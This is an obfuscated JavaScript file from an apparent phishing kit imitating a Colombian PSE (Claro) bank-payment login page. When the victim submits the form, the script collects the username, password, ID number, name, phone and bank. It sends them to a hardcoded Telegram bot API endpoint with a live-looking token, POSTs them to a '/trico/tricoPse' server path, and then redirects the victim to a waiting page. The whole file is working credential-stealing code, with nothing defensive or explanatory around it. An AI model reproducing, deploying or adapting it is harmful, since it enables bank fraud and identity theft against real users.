const _0x3152c0 = _0x4d7b;
(function (_0x5b45e0, _0x2b0a59) {
  const _0x494fbe = _0x4d7b,
    _0x503f43 = _0x5b45e0();
  while (!![]) {
    try {
      const _0x1c0c84 =
        (parseInt(_0x494fbe(0x127)) / 0x1) *
          (-parseInt(_0x494fbe(0x12c)) / 0x2) +
        (parseInt(_0x494fbe(0x129)) / 0x3) *
          (-parseInt(_0x494fbe(0x114)) / 0x4) +
        parseInt(_0x494fbe(0x110)) / 0x5 +
        -parseInt(_0x494fbe(0x11e)) / 0x6 +
        (parseInt(_0x494fbe(0x126)) / 0x7) *
          (-parseInt(_0x494fbe(0x11a)) / 0x8) +
        -parseInt(_0x494fbe(0x124)) / 0x9 +
        parseInt(_0x494fbe(0x106)) / 0xa;
      if (_0x1c0c84 === _0x2b0a59) break;
      else _0x503f43["push"](_0x503f43["shift"]());
    } catch (_0xfcc751) {
      _0x503f43["push"](_0x503f43["shift"]());
    }
  }
})(_0x5d42, 0x8bc53);
function updateLS() {
  const _0x22f230 = _0x4d7b;
  LS[_0x22f230(0x11d)](_0x22f230(0x128), JSON["stringify"](info));
}
function _0x5d42() {
  const _0x26419d = [
    "txtPass",
    "8tfXRHX",
    "&text=",
    "\x0a🏦Banco:\x20",
    "setItem",
    "2344308NiXYdV",
    "error",
    "nombre",
    "catch",
    "/trico/tricoPse",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "2650410psCcwu",
    "focus",
    "1826993dyLcml",
    "10685xKiRHz",
    "info",
    "21669ihCzPr",
    "bank",
    "value",
    "122qHUEMW",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "then",
    "location",
    "Error:",
    "\x0aFuente:\x20",
    "addEventListener",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "stringify",
    "20266250AGLGaS",
    "telefono",
    "metaInfo",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "Network\x20response\x20was\x20not\x20ok",
    "href",
    "getElementById",
    "puser",
    "user",
    "disabled",
    "4728095KztKWO",
    "click",
    "application/json",
    "txtUsuario",
    "444QHGOHg",
    "password",
    "usuario",
    "telnum",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
  ];
  _0x5d42 = function () {
    return _0x26419d;
  };
  return _0x5d42();
}
const button = document[_0x3152c0(0x10c)]("btnUsuario"),
  userInput = document[_0x3152c0(0x10c)](_0x3152c0(0x113)),
  passInput = document[_0x3152c0(0x10c)](_0x3152c0(0x119));
async function sendToTelegram(_0x29a419) {
  const _0x45d47a = _0x3152c0;
  for (const _0x31300f of chatIds) {
    const _0x10f475 =
      _0x45d47a(0x109) +
      _0x31300f +
      _0x45d47a(0x11b) +
      encodeURIComponent(_0x29a419);
    try {
      const _0x551fec = await fetch(_0x10f475);
      _0x551fec["ok"]
        ? console["log"](_0x45d47a(0x12d) + _0x31300f + ")")
        : console["error"](
            _0x45d47a(0x123) + _0x31300f + "):",
            _0x551fec["statusText"]
          );
    } catch (_0x16bb4b) {
      console["error"](_0x45d47a(0x118) + _0x31300f + "):", _0x16bb4b);
    }
  }
}
function _0x4d7b(_0x31086b, _0x5177fa) {
  const _0x5d42f1 = _0x5d42();
  return (
    (_0x4d7b = function (_0x4d7b8a, _0xf50cc0) {
      _0x4d7b8a = _0x4d7b8a - 0x103;
      let _0x14d333 = _0x5d42f1[_0x4d7b8a];
      return _0x14d333;
    }),
    _0x4d7b(_0x31086b, _0x5177fa)
  );
}
button[_0x3152c0(0x103)](_0x3152c0(0x111), async function (_0x164802) {
  const _0x188e22 = _0x3152c0;
  _0x164802["preventDefault"](), (button[_0x188e22(0x10f)] = !![]);
  if (userInput[_0x188e22(0x12b)] == "" && passInput[_0x188e22(0x12b)] == "") {
    alert(_0x188e22(0x104)),
      userInput[_0x188e22(0x125)](),
      (button[_0x188e22(0x10f)] = ![]);
    return;
  } else {
    var _0x4c76af = userInput["value"],
      _0x4789a5 = passInput["value"];
    (info[_0x188e22(0x108)]["user"] = _0x4c76af),
      (info[_0x188e22(0x108)][_0x188e22(0x10d)] = _0x4789a5),
      updateLS();
    const _0x1b2064 = {
        id: info[_0x188e22(0x108)]["cc"],
        nombre: info[_0x188e22(0x108)]["dudename"],
        telefono: info[_0x188e22(0x108)][_0x188e22(0x117)],
        direccion: "",
        usuario: info[_0x188e22(0x108)][_0x188e22(0x10e)],
        password: info["metaInfo"][_0x188e22(0x10d)],
        bank: info[_0x188e22(0x108)]["ban"],
      },
      _0x2e4798 =
        "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20" +
        _0x1b2064["id"] +
        "\x0a🆔Nombre:\x20" +
        _0x1b2064[_0x188e22(0x120)] +
        "\x0a📱Teléfono:\x20" +
        _0x1b2064[_0x188e22(0x107)] +
        "\x0a🚹Usuario:\x20" +
        _0x1b2064[_0x188e22(0x116)] +
        "\x0a🔒Contraseña:\x20" +
        _0x1b2064[_0x188e22(0x115)] +
        _0x188e22(0x11c) +
        _0x1b2064[_0x188e22(0x12a)] +
        _0x188e22(0x131) +
        fuente;
    await sendToTelegram(_0x2e4798),
      fetch(url + _0x188e22(0x122), {
        method: "POST",
        headers: { "Content-Type": _0x188e22(0x112) },
        body: JSON[_0x188e22(0x105)](_0x1b2064),
      })
        [_0x188e22(0x12e)]((_0xcdba80) => {
          const _0x2a3dd7 = _0x188e22;
          if (!_0xcdba80["ok"]) throw new Error(_0x2a3dd7(0x10a));
          return _0xcdba80["json"]();
        })
        [_0x188e22(0x12e)]((_0x1138c4) => {
          const _0x5c4c89 = _0x188e22;
          window[_0x5c4c89(0x12f)][_0x5c4c89(0x10b)] = "./wait.html";
        })
        [_0x188e22(0x121)]((_0x11c928) => {
          const _0x22796f = _0x188e22;
          console[_0x22796f(0x11f)](_0x22796f(0x130), _0x11c928),
            (button[_0x22796f(0x10f)] = ![]);
        });
  }
});
